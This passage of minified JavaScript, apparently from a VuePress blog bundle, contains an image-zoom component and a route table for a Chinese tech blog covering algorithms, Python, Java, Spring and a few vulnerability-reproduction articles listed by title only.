e=n.touches[0],t=e.clientX,a=e.clientY;this.move(t,a)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function el(n){return 0===n.button}function tl(n){return n.metaKey||n.ctrlKey}var al={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,Ws(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),Hs(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){Ws(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},rl="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},il=function(){function n(n,e){for(var t=0;t<e.length;t++){var a=e[t];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(n,a.key,a)}}return function(e,t,a){return t&&n(e.prototype,t),a&&n(e,a),e}}(),ol=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var a in t)Object.prototype.hasOwnProperty.call(t,a)&&(n[a]=t[a])}return n},sl={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=Js(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,a=n.transitionDuration,r=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?Ns:qs,transition:Gs+"\n        "+a+"s\n        "+r,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=Ws(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,Ws(this.el,{transform:"none"})},grab:function(n,e,t){var a=ll(),r=a.x-n,i=a.y-e;Ws(this.el,{cursor:$s,transform:"translate3d(\n        "+(this.translate.x+r)+"px, "+(this.translate.y+i)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var a=ll(),r=a.x-n,i=a.y-e;Ws(this.el,{transition:Gs,transform:"translate3d(\n        "+(this.translate.x+r)+"px, "+(this.translate.y+i)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){Ws(this.el,this.styleClose)},restoreOpenStyle:function(){Ws(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=ll(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,a=this.instance.options,r=a.customSize,i=a.scaleBase;if(!r&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(r&&"object"===(void 0===r?"undefined":rl(r)))return{x:r.width/this.rect.width,y:r.height/this.rect.height};var o=this.rect.width/2,s=this.rect.height/2,l=ll(),c={x:l.x-o,y:l.y-s},p=c.x/o,d=c.y/s,u=i+Math.min(p,d);if(r&&"string"==typeof r){var m=t||this.el.naturalWidth,h=e||this.el.naturalHeight,g=parseFloat(r)*m/(100*this.rect.width),f=parseFloat(r)*h/(100*this.rect.height);if(u>g||u>f)return{x:g,y:f}}return{x:u,y:u}}};function ll(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function cl(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(a){Hs(n,a,e[a],t)}))}var pl=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(sl),this.overlay=Object.create(al),this.handler=Object.create(nl),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=ol({},Ys,e),this.overlay.init(this),this.handler.init(this)}return il(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=Us,Hs(n,"click",this.handler.click),this.options.preloadImage&&Vs(Js(n)));return this}},{key:"config",value:function(n){return n?(ol(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var a="string"==typeof n?document.querySelector(n):n;if("IMG"===a.tagName){if(this.options.onBeforeOpen(a),this.target.init(a,this),!this.options.preloadImage){var r=this.target.srcOriginal;null!=r&&(this.options.onImageLoading(a),Vs(r,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),Hs(document,"scroll",this.handler.scroll),Hs(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&Hs(window,"resize",this.handler.resizeWindow);var i=function n(){Hs(a,Ks,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&cl(document,e.handler,!0),t(a)};return Hs(a,Ks,i),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=Rs,this.overlay.fadeOut(),this.target.zoomOut(),Hs(document,"scroll",this.handler.scroll,!1),Hs(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&Hs(window,"resize",this.handler.resizeWindow,!1);var a=function a(){Hs(t,Ks,a,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&cl(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return Hs(t,Ks,a),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var r=this.target.el;this.options.onBeforeGrab(r),this.released=!1,this.target.grab(n,e,t);var i=function n(){Hs(r,Ks,n,!1),a(r)};return Hs(r,Ks,i),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=$s,this.target.move(n,e,t);var r=this.target.el,i=function n(){Hs(r,Ks,n,!1),a(r)};return Hs(r,Ks,i),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=Rs,this.target.restoreOpenStyle();var a=function a(){Hs(t,Ks,a,!1),n.lock=!1,n.released=!0,e(t)};return Hs(t,Ks,a),this}}}]),n}();const dl=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),ul=Number("500");class ml{constructor(){this.instance=new pl(dl)}update(n=".theme-vdoing-content img:not(.no-zoom)"){"undefined"!=typeof window&&this.instance.listen(n)}updateDelay(n=".theme-vdoing-content img:not(.no-zoom)",e=ul){setTimeout(()=>this.update(n),e)}}var hl=[gs,ks,Bs,Cs,Ms,{watch:{"$page.path"(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted(){this.$vuepress.zooming=new ml,this.$vuepress.zooming.updateDelay()}}],gl={name:"GlobalLayout",computed:{layout(){const n=this.getLayout();return ps("layout",n),Vt.component(n)}},methods:{getLayout(){if(this.$page.path){const n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},fl=t(3),bl=Object(fl.a)(gl,(function(){return(0,this._self._c)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),n[e].push(...t);break;default:throw new Error("Unknown option name.")}}(bl,"mixins",hl);const vl=[{name:"v-a197b1f0",path:"/pages/c0018a/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-a197b1f0").then(t)}},{path:"/pages/c0018a/index.html",redirect:"/pages/c0018a/"},{path:"/01.数据结构与算法/01.leetcode/124. 二叉树中的最大路径和.html",redirect:"/pages/c0018a/"},{name:"v-4a2865d5",path:"/pages/982656/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-4a2865d5").then(t)}},{path:"/pages/982656/index.html",redirect:"/pages/982656/"},{path:"/01.数据结构与算法/01.leetcode/196. 删除重复的电子邮箱.html",redirect:"/pages/982656/"},{name:"v-659b0039",path:"/pages/795a2d/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-659b0039").then(t)}},{path:"/pages/795a2d/index.html",redirect:"/pages/795a2d/"},{path:"/01.数据结构与算法/01.leetcode/178. 分数排名.html",redirect:"/pages/795a2d/"},{name:"v-7468d340",path:"/pages/df92d1/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-7468d340").then(t)}},{path:"/pages/df92d1/index.html",redirect:"/pages/df92d1/"},{path:"/01.数据结构与算法/01.leetcode/210. 课程表 II.html",redirect:"/pages/df92d1/"},{name:"v-53730a12",path:"/pages/620bd9/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-53730a12").then(t)}},{path:"/pages/620bd9/index.html",redirect:"/pages/620bd9/"},{path:"/01.数据结构与算法/01.leetcode/324. 摆动排序 II.html",redirect:"/pages/620bd9/"},{name:"v-02dc103a",path:"/pages/936e38/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-02dc103a").then(t)}},{path:"/pages/936e38/index.html",redirect:"/pages/936e38/"},{path:"/01.数据结构与算法/01.leetcode/329. 矩阵中的最长递增路径.html",redirect:"/pages/936e38/"},{name:"v-f423a396",path:"/pages/b79555/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-f423a396").then(t)}},{path:"/pages/b79555/index.html",redirect:"/pages/b79555/"},{path:"/01.数据结构与算法/02.牛客网/93.NC93 设计LRU缓存结构.html",redirect:"/pages/b79555/"},{name:"v-66322c34",path:"/pages/a90be1/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-66322c34").then(t)}},{path:"/pages/a90be1/index.html",redirect:"/pages/a90be1/"},{path:"/01.数据结构与算法/03.排序/02.二分插入排序实现.html",redirect:"/pages/a90be1/"},{name:"v-29d4d5af",path:"/pages/9941e6/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-29d4d5af").then(t)}},{path:"/pages/9941e6/index.html",redirect:"/pages/9941e6/"},{path:"/01.数据结构与算法/03.排序/03.快速排序代码实现（简单版）.html",redirect:"/pages/9941e6/"},{name:"v-1d49c3c4",path:"/pages/fc2f07/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-1d49c3c4").then(t)}},{path:"/pages/fc2f07/index.html",redirect:"/pages/fc2f07/"},{path:"/01.数据结构与算法/03.排序/04.快速排序算法.html",redirect:"/pages/fc2f07/"},{name:"v-423f10bf",path:"/pages/c4ea10/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-423f10bf").then(t)}},{path:"/pages/c4ea10/index.html",redirect:"/pages/c4ea10/"},{path:"/01.数据结构与算法/03.排序/05拓扑排序.html",redirect:"/pages/c4ea10/"},{name:"v-2a30c810",path:"/pages/d681c3/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-2a30c810").then(t)}},{path:"/pages/d681c3/index.html",redirect:"/pages/d681c3/"},{path:"/01.数据结构与算法/04.树/01.平衡二叉树.html",redirect:"/pages/d681c3/"},{name:"v-23ffbece",path:"/pages/82d820/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-23ffbece").then(t)}},{path:"/pages/82d820/index.html",redirect:"/pages/82d820/"},{path:"/01.数据结构与算法/04.树/02.Hash树.html",redirect:"/pages/82d820/"},{name:"v-48338b9c",path:"/pages/f86449/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-48338b9c").then(t)}},{path:"/pages/f86449/index.html",redirect:"/pages/f86449/"},{path:"/01.数据结构与算法/04.树/03.trie树（前缀树_字典树）.html",redirect:"/pages/f86449/"},{name:"v-698f8d2e",path:"/pages/9a57e6/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-698f8d2e").then(t)}},{path:"/pages/9a57e6/index.html",redirect:"/pages/9a57e6/"},{path:"/01.数据结构与算法/05.搜索/01.记忆化搜索.html",redirect:"/pages/9a57e6/"},{name:"v-125e4674",path:"/pages/9a78a3/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-125e4674").then(t)}},{path:"/pages/9a78a3/index.html",redirect:"/pages/9a78a3/"},{path:"/01.数据结构与算法/05.搜索/02.快速选择(Quickselect)算法：寻找第k大的元素.html",redirect:"/pages/9a78a3/"},{name:"v-0c3a5b4c",path:"/ds/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-0c3a5b4c").then(t)}},{path:"/ds/index.html",redirect:"/ds/"},{path:"/01.数据结构与算法/catalog.html",redirect:"/ds/"},{name:"v-50db1517",path:"/pages/623446/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-50db1517").then(t)}},{path:"/pages/623446/index.html",redirect:"/pages/623446/"},{path:"/02.Python/01.anaconda常用指令.html",redirect:"/pages/623446/"},{name:"v-5366b9aa",path:"/pages/0f29b1/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-5366b9aa").then(t)}},{path:"/pages/0f29b1/index.html",redirect:"/pages/0f29b1/"},{path:"/02.Python/03.matplotlib一个界面绘制多个图.html",redirect:"/pages/0f29b1/"},{name:"v-3261059e",path:"/pages/857fce/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3261059e").then(t)}},{path:"/pages/857fce/index.html",redirect:"/pages/857fce/"},{path:"/02.Python/02.matplotlib解决中文显示问题_.html",redirect:"/pages/857fce/"},{name:"v-e8816230",path:"/pages/e08ab4/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-e8816230").then(t)}},{path:"/pages/e08ab4/index.html",redirect:"/pages/e08ab4/"},{path:"/02.Python/04.Python韦恩图绘制.html",redirect:"/pages/e08ab4/"},{name:"v-2c25e620",path:"/pages/1a164c/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-2c25e620").then(t)}},{path:"/pages/1a164c/index.html",redirect:"/pages/1a164c/"},{path:"/02.Python/05.python删除文件.html",redirect:"/pages/1a164c/"},{name:"v-69989b25",path:"/python/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-69989b25").then(t)}},{path:"/python/index.html",redirect:"/python/"},{path:"/02.Python/catalog.html",redirect:"/python/"},{name:"v-3addfbd3",path:"/pages/111aef/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3addfbd3").then(t)}},{path:"/pages/111aef/index.html",redirect:"/pages/111aef/"},{path:"/03.安全/01.漏洞复现/01.Apache Shiro系列漏洞利用以及实战总结.html",redirect:"/pages/111aef/"},{name:"v-4750fcf7",path:"/pages/b2c493/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-4750fcf7").then(t)}},{path:"/pages/b2c493/index.html",redirect:"/pages/b2c493/"},{path:"/03.安全/01.漏洞复现/02.CVE-2020-2957复现.html",redirect:"/pages/b2c493/"},{name:"v-2fb8fa08",path:"/pages/294836/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-2fb8fa08").then(t)}},{path:"/pages/294836/index.html",redirect:"/pages/294836/"},{path:"/03.安全/01.漏洞复现/03.CVE-2020-11989 漏洞复现.html",redirect:"/pages/294836/"},{name:"v-5e38753e",path:"/pages/f26408/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-5e38753e").then(t)}},{path:"/pages/f26408/index.html",redirect:"/pages/f26408/"},{path:"/03.安全/02.浅谈漏洞来源(CVE,NVD,CNVD,CNNVD).html",redirect:"/pages/f26408/"},{name:"v-120e30c7",path:"/safe/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-120e30c7").then(t)}},{path:"/safe/index.html",redirect:"/safe/"},{path:"/03.安全/catalog.html",redirect:"/safe/"},{name:"v-317592a9",path:"/pages/da78ec/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-317592a9").then(t)}},{path:"/pages/da78ec/index.html",redirect:"/pages/da78ec/"},{path:"/04.java/01.基础/01.java retry_详解.html",redirect:"/pages/da78ec/"},{name:"v-43a2d958",path:"/pages/225f1b/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-43a2d958").then(t)}},{path:"/pages/225f1b/index.html",redirect:"/pages/225f1b/"},{path:"/04.java/01.基础/03.java_volalite关键字.html",redirect:"/pages/225f1b/"},{name:"v-3631b24f",path:"/pages/2b7746/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3631b24f").then(t)}},{path:"/pages/2b7746/index.html",redirect:"/pages/2b7746/"},{path:"/04.java/01.基础/02.java_双重检查 线程安全的懒汉式单例模式.html",redirect:"/pages/2b7746/"},{name:"v-18dd19f6",path:"/pages/b5180a/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-18dd19f6").then(t)}},{path:"/pages/b5180a/index.html",redirect:"/pages/b5180a/"},{path:"/04.java/01.基础/04.Java基础—break label 带标签的break语句的用法.html",redirect:"/pages/b5180a/"},{name:"v-1be156df",path:"/pages/2ccc12/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-1be156df").then(t)}},{path:"/pages/2ccc12/index.html",redirect:"/pages/2ccc12/"},{path:"/04.java/01.基础/05.java正则表达式.html",redirect:"/pages/2ccc12/"},{name:"v-04d25b96",path:"/pages/328c06/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-04d25b96").then(t)}},{path:"/pages/328c06/index.html",redirect:"/pages/328c06/"},{path:"/04.java/01.基础/06.java中的关键字 transient.html",redirect:"/pages/328c06/"},{name:"v-22ab50af",path:"/pages/a60cf2/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-22ab50af").then(t)}},{path:"/pages/a60cf2/index.html",redirect:"/pages/a60cf2/"},{path:"/04.java/01.基础/07.Java终止线程的三种方式.html",redirect:"/pages/a60cf2/"},{name:"v-3d83cf96",path:"/pages/3da978/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3d83cf96").then(t)}},{path:"/pages/3da978/index.html",redirect:"/pages/3da978/"},{path:"/04.java/01.基础/08.Lombok注解-@SneakyThrows.html",redirect:"/pages/3da978/"},{name:"v-d14288e2",path:"/pages/e8f31e/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-d14288e2").then(t)}},{path:"/pages/e8f31e/index.html",redirect:"/pages/e8f31e/"},{path:"/04.java/01.基础/09.String.intern().html",redirect:"/pages/e8f31e/"},{name:"v-7952bb62",path:"/pages/644e67/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-7952bb62").then(t)}},{path:"/pages/644e67/index.html",redirect:"/pages/644e67/"},{path:"/04.java/01.基础/10.java 中为 final 变量赋值的几种方式.html",redirect:"/pages/644e67/"},{name:"v-52936b54",path:"/pages/ee7b99/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-52936b54").then(t)}},{path:"/pages/ee7b99/index.html",redirect:"/pages/ee7b99/"},{path:"/04.java/01.基础/11.Java8 新特性之 Optional 正确理解和用法.html",redirect:"/pages/ee7b99/"},{name:"v-5fa09f51",path:"/pages/4cb11b/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-5fa09f51").then(t)}},{path:"/pages/4cb11b/index.html",redirect:"/pages/4cb11b/"},{path:"/04.java/02.集合/01.Collections.synchronizedMap().html",redirect:"/pages/4cb11b/"},{name:"v-1ee927b6",path:"/pages/c888ad/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-1ee927b6").then(t)}},{path:"/pages/c888ad/index.html",redirect:"/pages/c888ad/"},{path:"/04.java/03.多线程/00.java 多线程的基本使用.html",redirect:"/pages/c888ad/"},{name:"v-1ec80cec",path:"/pages/6998f2/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-1ec80cec").then(t)}},{path:"/pages/6998f2/index.html",redirect:"/pages/6998f2/"},{path:"/04.java/03.多线程/01.java 线程池.html",redirect:"/pages/6998f2/"},{name:"v-96a8abe0",path:"/pages/1a6f48/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-96a8abe0").then(t)}},{path:"/pages/1a6f48/index.html",redirect:"/pages/1a6f48/"},{path:"/04.java/03.多线程/02.java 有返回值的线程.html",redirect:"/pages/1a6f48/"},{name:"v-459d5a6f",path:"/pages/3f210f/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-459d5a6f").then(t)}},{path:"/pages/3f210f/index.html",redirect:"/pages/3f210f/"},{path:"/04.java/03.多线程/04.java 多线程 Threadlocal.html",redirect:"/pages/3f210f/"},{name:"v-38ec4099",path:"/pages/e50b43/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-38ec4099").then(t)}},{path:"/pages/e50b43/index.html",redirect:"/pages/e50b43/"},{path:"/04.java/03.多线程/05.java JUC包实现多线程.html",redirect:"/pages/e50b43/"},{name:"v-555f1af9",path:"/pages/3bc47f/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-555f1af9").then(t)}},{path:"/pages/3bc47f/index.html",redirect:"/pages/3bc47f/"},{path:"/04.java/03.多线程/06.Java多线程让主线程等待子线程结束.html",redirect:"/pages/3bc47f/"},{name:"v-8cd8bc44",path:"/pages/a5c115/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-8cd8bc44").then(t)}},{path:"/pages/a5c115/index.html",redirect:"/pages/a5c115/"},{path:"/04.java/03.多线程/09.使用 Condition, wait 和 notify 的替代品.html",redirect:"/pages/a5c115/"},{name:"v-51ef40e8",path:"/pages/062012/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-51ef40e8").then(t)}},{path:"/pages/062012/index.html",redirect:"/pages/062012/"},{path:"/04.java/03.多线程/10.一文彻底理解ReentrantLock可重入锁的使用.html",redirect:"/pages/062012/"},{name:"v-65e81c66",path:"/pages/7882c9/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-65e81c66").then(t)}},{path:"/pages/7882c9/index.html",redirect:"/pages/7882c9/"},{path:"/04.java/03.多线程/11.阻塞队列使用ReentrantLock源码分析.html",redirect:"/pages/7882c9/"},{name:"v-7d88bd5e",path:"/pages/d1b977/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-7d88bd5e").then(t)}},{path:"/pages/d1b977/index.html",redirect:"/pages/d1b977/"},{path:"/04.java/04.spring/01.@Bean注解的方法参数自动注入规则(构造函数一样遵守).html",redirect:"/pages/d1b977/"},{name:"v-6a558438",path:"/pages/73803e/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-6a558438").then(t)}},{path:"/pages/73803e/index.html",redirect:"/pages/73803e/"},{path:"/04.java/04.spring/03.Spring Bean 生命周期之“我要到哪里去”？.html",redirect:"/pages/73803e/"},{name:"v-20b845d4",path:"/pages/9e801a/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-20b845d4").then(t)}},{path:"/pages/9e801a/index.html",redirect:"/pages/9e801a/"},{path:"/04.java/04.spring/02.Spring Bean 生命周期之“我从哪里来”？.html",redirect:"/pages/9e801a/"},{name:"v-68be9a6f",path:"/pages/3bd6af/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-68be9a6f").then(t)}},{path:"/pages/3bd6af/index.html",redirect:"/pages/3bd6af/"},{path:"/04.java/04.spring/04.Spring Aware 到底是个啥？.html",redirect:"/pages/3bd6af/"},{name:"v-b52d430a",path:"/pages/1ac696/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-b52d430a").then(t)}},{path:"/pages/1ac696/index.html",redirect:"/pages/1ac696/"},{path:"/04.java/04.spring/05.spring bean的生命周期.html",redirect:"/pages/1ac696/"},{name:"v-49818cb1",path:"/pages/40850c/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-49818cb1").then(t)}},{path:"/pages/40850c/index.html",redirect:"/pages/40850c/"},{path:"/04.java/04.spring/06.Spring MVC原理及配置详解.html",redirect:"/pages/40850c/"},{name:"v-3d2f6db6",path:"/pages/5e8cb5/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-3d2f6db6").then(t)}},{path:"/pages/5e8cb5/index.html",redirect:"/pages/5e8cb5/"},{path:"/04.java/04.spring/07.Spring中的FactoryBean接口.html",redirect:"/pages/5e8cb5/"},{name:"v-01a0958e",path:"/pages/a40320/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-01a0958e").then(t)}},{path:"/pages/a40320/index.html",redirect:"/pages/a40320/"},{path:"/04.java/04.spring/08.SpringBoot应用启动过程分析.html",redirect:"/pages/a40320/"},{name:"v-46999f3c",path:"/pages/63890e/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-46999f3c").then(t)}},{path:"/pages/63890e/index.html",redirect:"/pages/63890e/"},{path:"/04.java/04.spring/09.springboot自定义starter时，starter内的配置文件不生效问题.html",redirect:"/pages/63890e/"},{name:"v-51100657",path:"/pages/441d52/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-51100657").then(t)}},{path:"/pages/441d52/index.html",redirect:"/pages/441d52/"},{path:"/04.java/04.spring/10.springmvc _ 配置拦截器 interceptor.html",redirect:"/pages/441d52/"},{name:"v-461fa684",path:"/pages/a8f65a/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-461fa684").then(t)}},{path:"/pages/a8f65a/index.html",redirect:"/pages/a8f65a/"},{path:"/04.java/04.spring/11.SpringBoot 中 @Value 注解设置默认值.html",redirect:"/pages/a8f65a/"},{name:"v-ecb575da",path:"/pages/1016ea/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-ecb575da").then(t)}},{path:"/pages/1016ea/index.html",redirect:"/pages/1016ea/"},{path:"/04.java/04.spring/12.Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma.html",redirect:"/pages/1016ea/"},{name:"v-54465354",path:"/pages/ecb5ee/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-54465354").then(t)}},{path:"/pages/ecb5ee/index.html",redirect:"/pages/ecb5ee/"},{path:"/04.java/04.spring/13.Spring IOC详解 以及 Bean生命周期详细过程.html",redirect:"/pages/ecb5ee/"},{name:"v-aab3f59e",path:"/pages/718972/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-aab3f59e").then(t)}},{path:"/pages/718972/index.html",redirect:"/pages/718972/"},{path:"/04.java/04.spring/14.自定义注解实现 AOP 日志记录.html",redirect:"/pages/718972/"},{name:"v-d2e6b59a",path:"/pages/36cb7f/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-d2e6b59a").then(t)}},{path:"/pages/36cb7f/index.html",redirect:"/pages/36cb7f/"},{path:"/04.java/04.spring/15.Spring boot 项目 maven 多模块打包 子模块报错 Unable to find ma.html",redirect:"/pages/36cb7f/"},{name:"v-9c711b94",path:"/pages/9ed795/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-9c711b94").then(t)}},{path:"/pages/9ed795/index.html",redirect:"/pages/9ed795/"},{path:"/04.java/04.spring/16.Spring IOC详解 以及 Bean生命周期详细过程.html",redirect:"/pages/9ed795/"},{name:"v-a25fe6de",path:"/pages/9f6f65/",component:bl,beforeEnter:(n,e,t)=>{cs("Layout","v-a25fe6de").then(t)}},{path:"/pages/9f6f65/index.html",redirect:"/pages/9f6f65/"},{path:"/04.java/04.spring/17.自定义注解实现 AOP 